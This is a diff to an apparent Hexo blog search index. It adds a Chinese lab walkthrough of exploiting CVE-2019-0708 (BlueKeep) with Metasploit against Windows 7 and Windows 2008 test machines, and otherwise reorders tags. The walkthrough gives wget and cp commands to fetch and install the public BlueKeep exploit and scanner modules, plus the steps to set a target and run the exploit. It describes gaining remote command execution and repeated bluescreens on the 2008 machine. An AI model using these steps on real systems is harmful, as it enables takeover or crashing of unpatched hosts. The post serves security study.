@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>msf CVE_2019_0708后门连接win7和win2008</title>
+      <link href="/2019/09/08/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/"/>
+      <url>/2019/09/08/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CVE-2019-0708影响范围"><a href="#CVE-2019-0708影响范围" class="headerlink" title="CVE-2019-0708影响范围"></a>CVE-2019-0708影响范围</h1><p>Windows 7<br>Windows server 2008 R2<br>Windows server 2008<br>Windows 2003<br>Windows xp<br>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p><h1 id="靶子机设置"><a href="#靶子机设置" class="headerlink" title="靶子机设置"></a>靶子机设置</h1><p><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908071844192.png" alt><br>查看IP地址cmd ipconfig</p><h1 id="kail运行"><a href="#kail运行" class="headerlink" title="kail运行"></a>kail运行</h1><h2 id="需要更新-msf"><a href="#需要更新-msf" class="headerlink" title="需要更新 msf"></a>需要更新 msf</h2><p><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072045652.png" alt><br>更新版本</p><pre><code>apt-get install metasploit-framework</code></pre><p><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072102993.png" alt></p><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><h3 id="靶子机是-win7-x64"><a href="#靶子机是-win7-x64" class="headerlink" title="靶子机是 win7 x64"></a>靶子机是 win7 x64</h3><p>进入msf查询武器<br>执行 search 0708<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072144281.png" alt></p><pre><code>wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</code></pre><p>或者自己下载套件，执行下面命令复制套件</p><pre><code>将攻击套件导入安装在不能复制创建文件夹在执行复制命令    cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/    cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/    cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/    cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</code></pre><p>执行 reload_all 重新加载 payload<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072531963.png" alt><br>设置目标ip、命名标号或跳过默认、执行exploit<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072635576.png" alt><br>查看设置 show options<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072706265.png" alt><br>联结成功<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073004830.png" alt><br>执行cmd，运行notepad，mspaint<br>靶子机的运行情况<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073133052.png" alt></p><h3 id="靶子机是-win2008"><a href="#靶子机是-win2008" class="headerlink" title="靶子机是 win2008"></a>靶子机是 win2008</h3><p>如果出现远程连接不能点等的问题<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073308414.png" alt><br>安装远程协助<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073311813.png" alt><br>问题解决<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073317051.png" alt><br>使用kail进行远程连接<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073400922.png" alt><br>多次尝试后出现总是出现蓝屏<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073429044.png" alt></p><h1 id="补充关于kail虚拟机的复制和文件拖拽功能"><a href="#补充关于kail虚拟机的复制和文件拖拽功能" class="headerlink" title="补充关于kail虚拟机的复制和文件拖拽功能"></a>补充关于kail虚拟机的复制和文件拖拽功能</h1><p>VM安装tools，解压执行 ./  自行安装后，如果出现不能文件拖拽<br>执行以下命令即可</p><pre><code>sudo apt-get autoremove open-vm-toolssudo apt-get install open-vm-toolssudo apt-get install open-vm-tools-desktop</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> 第八周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>正则表达式</title>
       <link href="/2019/09/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
       <url>/2019/09/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
@@ -499,9 +528,9 @@
       
         <tags>
             
-            <tag> 第六周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第六周 </tag>
             
         </tags>
       
@@ -528,9 +557,9 @@
       
         <tags>
             
-            <tag> 第六周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第六周 </tag>
             
         </tags>
       
@@ -1152,9 +1181,9 @@
       
         <tags>
             
-            <tag> 第三周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第三周 </tag>
             
         </tags>
       
@@ -1181,9 +1210,9 @@
       
         <tags>
             
-            <tag> 第三周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第三周 </tag>
             
         </tags>
       
@@ -1397,9 +1426,9 @@
       
         <tags>
             
-            <tag> 第三周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第三周 </tag>
             
             <tag> 第二周 </tag>
             
